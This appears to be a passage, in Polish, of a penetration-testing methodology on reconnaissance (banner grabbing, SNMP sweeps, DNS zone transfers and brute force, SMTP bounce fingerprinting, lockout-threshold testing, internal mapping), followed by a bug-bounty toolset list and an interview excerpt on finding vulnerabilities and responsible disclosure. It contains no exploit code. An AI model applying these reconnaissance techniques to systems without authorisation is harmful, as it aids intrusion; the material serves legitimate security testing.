Należy również przetestować protokół IPv6.

Łapanie sztandarów
Przechwytywanie banerów to technika wyliczania używana do zbierania informacji o systemach komputerowych w sieci i usługach obsługujących jej otwarte porty. Przechwytywanie banerów służy do identyfikowania w sieci wersji aplikacji i systemu operacyjnego, na którym działa docelowy host.

Przechwytywanie banerów jest zwykle wykonywane przy użyciu protokołów Hyper Text Transfer Protocol (HTTP), File Transfer Protocol (FTP) i Simple Mail Transfer Protocol (SMTP); odpowiednio porty 80, 21 i 25. Narzędzia powszechnie używane do przechwytywania banerów to Telnet, nmap i Netcat.

Przeszukiwanie SNMP
Wykonywane są również przeszukiwania SNMP, ponieważ oferują one mnóstwo informacji o konkretnym systemie. Protokół SNMP jest protokołem bezstanowym zorientowanym na datagramy. Niestety serwery SNMP nie odpowiadają na żądania z nieprawidłowymi ciągami społecznościowymi, a leżący u ich podstaw protokół UDP nie zgłasza niezawodnie zamkniętych portów UDP. Oznacza to, że „brak odpowiedzi” z sondowanego adresu IP może oznaczać jedną z następujących sytuacji:

maszyna nieosiągalna
Serwer SNMP nie działa
nieprawidłowy ciąg społeczności
datagram odpowiedzi jeszcze nie dotarł
Transfery strefowe
Transfer strefy DNS, znany również jako AXFR, to rodzaj transakcji DNS. Jest to mechanizm zaprojektowany do replikacji baz danych zawierających dane DNS w zestawie serwerów DNS. Transfer strefowy jest dostępny w dwóch wersjach: pełnej (AXFR) i przyrostowej (IXFR). Dostępnych jest wiele narzędzi do testowania możliwości wykonania transferu strefy DNS. Narzędzia powszechnie używane do wykonywania transferów stref to host, dig i nmap.

Odbicie SMTP
Odesłanie SMTP, zwane także raportem/potwierdzeniem niedostarczenia (NDR), (nieudanym) powiadomieniem o statusie doręczenia (DSN), powiadomieniem o niedostarczeniu (NDN) lub po prostu odbiciem, to automatyczna wiadomość e-mail od system pocztowy informujący nadawcę kolejnej wiadomości o problemie z dostarczeniem. Może to pomóc atakującemu w uzyskaniu odcisku palca serwera SMTP, ponieważ informacje o serwerze SMTP, w tym oprogramowanie i wersje, mogą być zawarte w odesłanej wiadomości.

Można to zrobić, po prostu tworząc fałszywy adres w domenie celu. Na przykład asDFADSF_garbage_address@target.com może zostać użyty do przetestowania target.com. Gmail zapewnia pełny dostęp do nagłówków, dzięki czemu jest łatwym wyborem dla testerów.

Wykrywanie DNS
Wykrywanie DNS można przeprowadzić, przeglądając rekordy WHOIS dla autorytatywnego serwera nazw domeny. Dodatkowo należy sprawdzić wariacje nazwy domeny głównej, a także sprawdzić witrynę pod kątem odniesień do innych domen, które mogą znajdować się pod kontrolą celu.

DNS do przodu/do tyłu
Odwrotnego DNS można użyć do uzyskania prawidłowych nazw serwerów używanych w organizacji. Istnieje zastrzeżenie, że musi mieć rekord PTR (odwrotny) DNS, aby mógł rozpoznać nazwę z podanego adresu IP. Jeśli zostanie rozwiązany, wyniki zostaną zwrócone. Zwykle odbywa się to poprzez przetestowanie serwera z różnymi adresami IP, aby sprawdzić, czy zwraca jakieś wyniki.

Bruteforce DNS
Po zidentyfikowaniu wszystkich informacji związanych z domenami klienta nadszedł czas, aby rozpocząć wysyłanie zapytań do DNS. Ponieważ DNS jest używany do mapowania adresów IP na nazwy hostów i odwrotnie, będziemy chcieli sprawdzić, czy jest niepewnie skonfigurowany. Będziemy dążyć do wykorzystania DNS w celu ujawnienia dodatkowych informacji o kliencie. Jedną z najpoważniejszych błędnych konfiguracji związanych z DNS jest umożliwienie użytkownikom Internetu wykonania transferu strefy DNS. Istnieje kilka narzędzi, których możemy użyć do wyliczenia DNS, aby nie tylko sprawdzić możliwość wykonywania transferów stref, ale także potencjalnie wykryć dodatkowe nazwy hostów, które nie są powszechnie znane.

Wykrywanie aplikacji internetowych
Identyfikacja słabych aplikacji internetowych może być szczególnie owocnym zajęciem podczas testu penetracyjnego. Rzeczy, których należy szukać, obejmują aplikacje OTS, które zostały źle skonfigurowane, aplikacje OTS, które mają funkcjonalność wtyczek (wtyczki często zawierają bardziej podatny na ataki kod niż aplikacja podstawowa) oraz aplikacje niestandardowe. Odciski palców aplikacji internetowych, takie jak WAFP, mogą być tutaj używane z doskonałym skutkiem.

Wykrywanie i wyliczanie wirtualnych hostów
Serwery internetowe często obsługują wiele „wirtualnych” hostów w celu skonsolidowania funkcjonalności na jednym serwerze. Jeśli wiele serwerów wskazuje ten sam adres DNS, mogą one być hostowane na tym samym serwerze. Narzędzia, takie jak wyszukiwanie MSN, mogą być używane do mapowania adresu IP na zestaw hostów wirtualnych.

Stwórz zewnętrzną listę docelową
Po wykonaniu powyższych czynności należy sporządzić listę użytkowników, adresów e-mail, domen, aplikacji, hostów i usług.

Wersje mapowania
Sprawdzanie wersji to szybki sposób identyfikowania informacji o aplikacji. Do pewnego stopnia wersje usług można pobrać za pomocą nmap, a wersje aplikacji internetowych można często zebrać, patrząc na źródło dowolnej strony.

Identyfikacja poziomów poprawek
Aby wewnętrznie zidentyfikować poziom poprawek usług, rozważ użycie oprogramowania, które będzie badać system pod kątem różnic między wersjami. Poświadczenia mogą być używane w tej fazie testu penetracyjnego, pod warunkiem, że klient wyraził na to zgodę. Skanery luk w zabezpieczeniach są szczególnie skuteczne w zdalnym identyfikowaniu poziomów poprawek bez poświadczeń.

Szukam słabych aplikacji internetowych
Identyfikacja słabych aplikacji internetowych może być szczególnie owocnym zajęciem podczas testu penetracyjnego. Rzeczy, których należy szukać, obejmują aplikacje OTS, które zostały źle skonfigurowane, aplikacje OTS, które mają funkcjonalność wtyczek (wtyczki często zawierają bardziej podatny na ataki kod niż aplikacja podstawowa) oraz aplikacje niestandardowe. Odciski palców aplikacji internetowych, takie jak WAFP, mogą być tutaj używane z doskonałym skutkiem.


Zidentyfikuj próg blokady
Zidentyfikowanie progu blokady usługi uwierzytelniania pozwoli upewnić się, że ataki bruteforce nie blokują celowo ważnych użytkowników podczas testowania. Zidentyfikuj wszystkie różne usługi uwierzytelniania w środowisku i przetestuj pojedyncze, nieszkodliwe konto pod kątem blokady. Często wystarczy 5 - 10 prób prawidłowego konta, aby ustalić, czy usługa zablokuje użytkowników.

Ślad wewnętrzny
Rekonesans pasywny
Jeśli tester ma dostęp do sieci wewnętrznej, wąchanie pakietów może dostarczyć wielu informacji. Użyj technik, takich jak te zaimplementowane w p0f, aby zidentyfikować systemy.

Zidentyfikuj wewnętrzne zakresy klientów
Podczas przeprowadzania testów wewnętrznych najpierw wylicz swoją lokalną podsieć, a następnie często możesz ekstrapolować stamtąd do innych podsieci, nieznacznie modyfikując adres. Spojrzenie na tablicę routingu hosta wewnętrznego może być szczególnie wymowne. Poniżej znajduje się kilka technik, które można zastosować.

Serwery DHCP mogą być potencjalnym źródłem nie tylko informacji lokalnych, ale także zdalnych zakresów adresów IP i szczegółów ważnych hostów. Większość serwerów DHCP zapewnia lokalny adres bramy IP, a także adresy serwerów DNS i WINS. W sieciach opartych na systemie Windows serwery DNS są zazwyczaj kontrolerami domeny usługi Active Directory, a zatem obiektami zainteresowania.

Aktywny rozpoznanie
Wewnętrzny rekonesans aktywny powinien zawierać wszystkie elementy zewnętrznego, a dodatkowo powinien koncentrować się na funkcjonalnościach intranetowych takich jak:

Usługi katalogowe (Active Directory, Novell, Sun itp.)
Witryny intranetowe zapewniające funkcjonalność biznesową
Aplikacje korporacyjne (ERP, CRM, Księgowość itp.)
Identyfikacja wrażliwych segmentów sieci (księgowość, R&D, marketing itp.)
Mapowanie dostępu do sieci produkcyjnych (centra danych)
Infrastruktura VoIP
Udostępnianie uwierzytelniania (kerberos, tokeny plików cookie itp.)
Zarządzanie serwerem proxy i dostępem do Internetu

Zidentyfikuj mechanizmy ochrony
Należy zidentyfikować i zmapować następujące elementy zgodnie z odpowiednią lokalizacją/grupą/osobami objętymi zakresem. Umożliwi to prawidłowe zastosowanie badań i wykorzystania luk w zabezpieczeniach podczas przeprowadzania rzeczywistego ataku - maksymalizując w ten sposób skuteczność ataku i minimalizując współczynnik wykrywalności.

Zabezpieczenia oparte na sieci
„Proste” filtry pakietów
Urządzenia kształtujące ruch
Systemy DLP
Szyfrowanie/tunelowanie

Zabezpieczenia oparte na hoście
Zabezpieczenia stosu/sterty
Biała lista aplikacji
AV/filtrowanie/analiza behawioralna
Systemy DLP

Zabezpieczenia na poziomie aplikacji
Zidentyfikuj zabezpieczenia aplikacji
Opcje kodowania
Potencjalne obwodnice
Strony z białej listy

Zabezpieczenia pamięci masowej
HBA — poziom hosta
Maskowanie LUN
Kontroler pamięci masowej
Sekret iSCSI CHAP

Ochrona użytkownika
Oprogramowanie do filtrowania AV/spamu
Konfiguracja SW, która ogranicza możliwości wykorzystania, może być uznana za antyspamową/antyAV
----------------------------------------------------------


**Zestaw narzędzi
Przyznaję, że nie używam wielu narzędzi, przez większość czasu piszę szybki skrypt PHP/Python. Powinienem, dzięki temu moje sesje byłyby bardziej wydajne, ale to są te podstawowe, z których korzystam cały czas.

Należy zauważyć, że automatyczne skanery (takie jak Acunetix lub Nikto) generują dużo hałasu. Większość programów zabrania ich używania z tego powodu. Poza tym jest bardzo mało prawdopodobne, że za pomocą takiego skanera znajdziesz coś, czego nikt inny nie znalazł.

Burp Suite — przechwytujący serwer proxy, który umożliwia modyfikowanie żądań w locie, powtarzanie żądań i tak dalej.
Nmap - Przydatny do wyszukiwania dodatkowych serwerów WWW do zbadania (pod warunkiem, że zakres programu jest wystarczająco szeroki)
Wykrywanie DNS — znajdź dodatkowe subdomeny do zbadania**


Na czym polega wykrywanie exploitów 0-day?

O. Czasem znalezienie luk w zabezpieczeniach jest łatwe, czasem wymaga to dużo więcej pracy. To zawsze zależy od tego, czego szukasz. Znalezienie luki w zabezpieczeniach takiej jak Cross Site Scripting (XSS) w witrynie internetowej i exploitów dla niej jest niezwykle łatwe i nie wymaga automatycznych narzędzi; możesz to zrobić ręcznie.

P. Jak zdobywasz informacje? Czy zaczyna się od podpowiedzi, czy to tylko kwestia pogłębiania kodu w poszukiwaniu dziur?

O. Czasami po prostu wpadamy na pomysł i testujemy go, ale innym razem czytamy fora hakerów, aby dowiedzieć się, czego szukają nasi koledzy i jakie nowe exploity są opracowywane i wprowadzane na rynek. Dlatego tak ważne jest odpowiedzialne ujawnianie informacji. Jeśli miałbym opublikować na forum hakerskim informację o luce, którą odkryłem w konkretnej witrynie, cała grupa hakerów zacznie przeglądać tę witrynę i znajdować inne luki. To jak polowanie na trofea. Ważne jest, aby dać odpowiedniej firmie możliwość załatania wszelkich luk w zabezpieczeniach przed ujawnieniem wyników badań.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
